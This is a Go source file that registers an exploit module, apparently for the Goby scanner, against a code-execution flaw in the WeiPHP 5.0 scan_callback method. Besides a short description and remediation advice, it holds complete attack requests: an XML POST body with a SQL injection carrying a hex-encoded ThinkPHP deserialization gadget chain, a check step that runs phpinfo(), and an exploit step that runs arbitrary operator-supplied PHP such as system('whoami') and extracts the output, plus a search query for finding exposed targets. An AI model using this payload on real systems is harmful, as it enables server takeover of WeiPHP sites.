package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WeiPHP5.0 scan_callback method code execution vulnerability",
    "Description": "<p>WeiPHP is a convenient, fast, and highly scalable open source WeChat public account platform development framework. With it, you can easily build your own WeChat public account platform.</p><p>There is a deserialization vulnerability in the scan_callback method of WeiPHP 5.0, and attackers can directly obtain server permissions</p>",
    "Product": "WeiPHP",
    "Homepage": "https://www.weiphp.cn/",
    "DisclosureDate": "2022-07-31",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "(body=\"content=\\\"WeiPHP\" || body=\"/css/weiphp.css\" || title=\"weiphp\" || title=\"weiphp4.0\")",
    "Level": "3",
    "is0day": false,
    "VulType": [
        "Code Execution"
    ],
    "Impact": "<p>There is a deserialization vulnerability in the scan_callback method of WeiPHP 5.0, and attackers can directly obtain server permissions</p>",
    "Recommendation": "<p>1. The manufacturer has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.weiphp.cn/\">https://www.weiphp.cn</a>, or delete this method if not necessary</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
    "References": [
        "https://www.weiphp.cn/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "system('whoami')",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/public/index.php/weixin/Notice/index?img=phpinfo();exit();",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "<xml>\n<product_id>aaaa</product_id>\n<appid>exp</appid>\n<appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733a373a2276697369626c65223b613a323a7b693a303b723a383b693a313b733a353a226973436769223b7d733a363a22617070656e64223b613a323a7b693a303b723a383b693a313b733a363a226973416a6178223b7d7d733a393a22002a0066696c746572223b613a313a7b693a303b613a323a7b693a303b4f3a32313a227468696e6b5c766965775c6472697665725c506870223a303a7b7d693a313b733a373a22646973706c6179223b7d7d733a393a22002a00736572766572223b733a313a2231223b733a393a22002a00636f6e666967223b613a313a7b733a383a227661725f616a6178223b733a333a22696d67223b7d733a363a22002a00676574223b613a313a7b733a333a22696d67223b733a33303a223c3f70687020406576616c28245f524551554553545b27696d67275d293b223b7d7d7d7d7d7d,9,10,11,12-- </appid>\n<mch_id>aaa</mch_id>\n<nonce_str>aaa</nonce_str>\n<openid>aaa</openid>\n</xml>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "disable_functions",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/public/index.php/weixin/Notice/index?img=echo+md5(123);{{{code}}};exit();",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "<xml>\n<product_id>aaaa</product_id>\n<appid>exp</appid>\n<appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733a373a2276697369626c65223b613a323a7b693a303b723a383b693a313b733a353a226973436769223b7d733a363a22617070656e64223b613a323a7b693a303b723a383b693a313b733a363a226973416a6178223b7d7d733a393a22002a0066696c746572223b613a313a7b693a303b613a323a7b693a303b4f3a32313a227468696e6b5c766965775c6472697665725c506870223a303a7b7d693a313b733a373a22646973706c6179223b7d7d733a393a22002a00736572766572223b733a313a2231223b733a393a22002a00636f6e666967223b613a313a7b733a383a227661725f616a6178223b733a333a22696d67223b7d733a363a22002a00676574223b613a313a7b733a333a22696d67223b733a33303a223c3f70687020406576616c28245f524551554553545b27696d67275d293b223b7d7d7d7d7d7d,9,10,11,12-- </appid>\n<mch_id>aaa</mch_id>\n<nonce_str>aaa</nonce_str>\n<openid>aaa</openid>\n</xml>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|202cb962ac59075b964b07152d234b70([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "GobyQuery": "(body=\"content=\\\"WeiPHP\" || body=\"/css/weiphp.css\" || title=\"weiphp\" || title=\"weiphp4.0\")",
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "Is0day": true,
    "Translation": {
        "CN": {
            "Name": "WeiPHP5.0的 scan_callback 方法代码执行漏洞",
            "Product": "WeiPHP",
            "Description": "<p>WeiPHP是<span style=\"color: rgb(62, 62, 62);\">深圳市圆梦云科技有限公司基于thinkphp框架</span>一款方便快捷，扩展性强的开源微信公众号平台开发框架，利用它您可以轻松搭建一个属于自己的微信公众号平台。</p><p>WeiPHP5.0版本的scan_callback方法存在反序列化漏洞，攻击者可以直接获取服务器权限</p>",
            "Recommendation": "<p>1、厂商暂未修复此漏洞，<span style=\"font-size: 17.5px;\">&nbsp;</span>请用户联系厂商修复漏洞：<a href=\"https://www.weiphp.cn/\" target=\"_blank\">https://www.weiphp.cn/</a>，或者如非必要，删除此方法</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问此系统</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">WeiPHP5.0版本的scan_callback方法存在反序列化漏洞，攻击者可以直接获取服务器权限</span><br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "WeiPHP5.0 scan_callback method code execution vulnerability",
            "Product": "WeiPHP",
            "Description": "<p>WeiPHP is a convenient, fast, and highly scalable open source WeChat public account platform development framework. With it, you can easily build your own WeChat public account platform.</p><p>There is a deserialization vulnerability in the scan_callback method of WeiPHP 5.0, and attackers can directly obtain server permissions</p>",
            "Recommendation": "<p>1. The manufacturer has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.weiphp.cn/\" target=\"_blank\">https://www.weiphp.cn</a>, or delete this method if not necessary</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network</p>",
            "Impact": "<p>There is a deserialization vulnerability in the scan_callback method of WeiPHP 5.0, and attackers can directly obtain server permissions<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "CVSSScore": "10.0",
    "PocId": "10696"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
